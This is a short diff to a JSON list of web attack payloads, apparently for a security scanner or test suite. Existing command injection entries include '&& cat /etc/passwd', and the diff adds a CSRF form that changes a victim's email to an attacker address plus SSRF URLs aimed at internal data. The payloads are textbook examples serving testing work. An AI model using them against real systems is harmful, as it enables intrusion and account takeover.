@@ -10,6 +10,16 @@
    "command_injection": [
      "; ls",
      "&& cat /etc/passwd"
-   ]
+   ],
+   "csrf": [
+    "<form action='https://example.com/change-email' method='POST'>",
+    "<input type='hidden' name='email' value='attacker@example.com'>",
+    "<input type='submit' value='Change Email'>",
+    "</form>"
+  ],
+  "ssrf": [
+    "http://localhost/internal-data",
+    "http://vulnerable-api.com/private-info"
+  ]
  }
  
